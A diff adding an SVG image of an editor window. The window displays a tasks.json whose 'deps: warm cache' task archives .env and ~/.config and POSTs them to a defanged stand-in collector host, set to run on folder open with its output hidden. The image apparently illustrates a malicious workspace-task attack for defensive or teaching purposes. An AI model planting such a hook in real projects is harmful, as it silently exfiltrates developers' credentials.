@@ -1,0 +1,49 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 420" role="img">
+<defs><clipPath id="win"><rect x="10" y="8" width="580" height="404" rx="10"/></clipPath></defs>
+<rect width="600" height="420" fill="#eef1f5"/>
+<rect x="6" y="6" width="588" height="411" rx="13" fill="#000" opacity="0.05"/>
+<rect x="8" y="8" width="584" height="407" rx="12" fill="#000" opacity="0.08"/>
+<g clip-path="url(#win)">
+<rect x="10" y="8" width="580" height="404" fill="#1f2228"/>
+<rect x="10" y="8" width="580" height="30" fill="#2b2e35"/>
+<circle cx="28" cy="23" r="5.5" fill="#ff5f57"/><circle cx="46" cy="23" r="5.5" fill="#febc2e"/><circle cx="64" cy="23" r="5.5" fill="#28c840"/>
+<text x="300" y="27" text-anchor="middle" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="12" fill="#aab1bd">tasks.json — vault-audit-task</text>
+<rect x="10" y="38" width="580" height="32" fill="#25282e"/>
+<rect x="10" y="38" width="124" height="32" fill="#1f2228"/><rect x="10" y="38" width="124" height="2" fill="#7c9cff"/>
+<text x="22" y="59" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="12" font-weight="700" fill="#e5c07b">{}</text>
+<text x="42" y="59" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="12.5" fill="#e6e9ee">tasks.json</text>
+<path d="M113 50l7 7 M120 50l-7 7" stroke="#aab1bd" stroke-width="1.2" stroke-linecap="round"/>
+<text x="146" y="59" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="12" font-weight="700" fill="#8f7f55">{}</text>
+<text x="166" y="59" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="12.5" fill="#8b93a1">settings.json</text>
+<rect x="258" y="38" width="1" height="32" fill="#1f2228"/>
+<text x="24" y="87" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11.5" fill="#8b93a1">.vscode  ›  tasks.json  ›  tasks  ›  0</text>
+<text x="44" y="116" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">1</text>
+<text x="58.0" y="116" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#d6dae0">{</tspan></text>
+<text x="44" y="137" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">2</text>
+<text x="73.6" y="137" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#82aaff">"version"</tspan><tspan fill="#d6dae0">: </tspan><tspan fill="#c3e88d">"2.0.0"</tspan><tspan fill="#d6dae0">,</tspan></text>
+<text x="44" y="158" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">3</text>
+<text x="73.6" y="158" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#82aaff">"tasks"</tspan><tspan fill="#d6dae0">: [</tspan></text>
+<text x="44" y="179" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">4</text>
+<text x="89.2" y="179" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#d6dae0">{</tspan></text>
+<text x="44" y="200" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">5</text>
+<text x="104.8" y="200" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#82aaff">"label"</tspan><tspan fill="#d6dae0">: </tspan><tspan fill="#c3e88d">"deps: warm cache"</tspan><tspan fill="#d6dae0">,</tspan></text>
+<text x="44" y="221" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">6</text>
+<text x="104.8" y="221" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#82aaff">"type"</tspan><tspan fill="#d6dae0">: </tspan><tspan fill="#c3e88d">"shell"</tspan><tspan fill="#d6dae0">,</tspan></text>
+<text x="44" y="242" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">7</text>
+<text x="104.8" y="242" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#82aaff">"command"</tspan><tspan fill="#d6dae0">: </tspan><tspan fill="#c3e88d">"tar czf - .env ~/.config … |</tspan></text>
+<text x="120.4" y="263" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#c3e88d">curl -s -X POST hxxps://collector[.]example/u …"</tspan><tspan fill="#d6dae0">,</tspan></text>
+<text x="44" y="284" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">8</text>
+<text x="104.8" y="284" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#82aaff">"runOptions"</tspan><tspan fill="#d6dae0">: { </tspan><tspan fill="#82aaff">"runOn"</tspan><tspan fill="#d6dae0">: </tspan><tspan fill="#c3e88d">"folderOpen"</tspan><tspan fill="#d6dae0"> },</tspan></text>
+<text x="44" y="305" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">9</text>
+<text x="104.8" y="305" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#82aaff">"presentation"</tspan><tspan fill="#d6dae0">: { </tspan><tspan fill="#82aaff">"reveal"</tspan><tspan fill="#d6dae0">: </tspan><tspan fill="#c3e88d">"never"</tspan><tspan fill="#d6dae0">, </tspan><tspan fill="#82aaff">"echo"</tspan><tspan fill="#d6dae0">: </tspan><tspan fill="#f78c6c">false</tspan><tspan fill="#d6dae0"> }</tspan></text>
+<text x="44" y="326" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">10</text>
+<text x="89.2" y="326" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#d6dae0">}</tspan></text>
+<text x="44" y="347" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">11</text>
+<text x="73.6" y="347" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#d6dae0">]</tspan></text>
+<text x="44" y="368" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13" fill="#5c6370">12</text>
+<text x="58.0" y="368" font-family="ui-monospace, 'SF Mono', Menlo, monospace" font-size="13"><tspan fill="#d6dae0">}</tspan></text>
+<rect x="10" y="390" width="580" height="22" fill="#3557c7"/>
+<circle cx="23" cy="397" r="2" fill="none" stroke="#fff" stroke-width="1.2"/><circle cx="23" cy="406" r="2" fill="none" stroke="#fff" stroke-width="1.2"/><circle cx="30" cy="399" r="2" fill="none" stroke="#fff" stroke-width="1.2"/><path d="M23 399v5 M30 401c0 3 -7 2 -7 3" fill="none" stroke="#fff" stroke-width="1.2"/>
+<text x="38" y="405" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" fill="#fff">main</text>
+<text x="580" y="405" text-anchor="end" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" fill="#fff">Ln 1, Col 1<tspan dx="16">Spaces: 2</tspan><tspan dx="16">UTF-8</tspan><tspan dx="16">JSON with Comments</tspan></text>
+</g></svg>
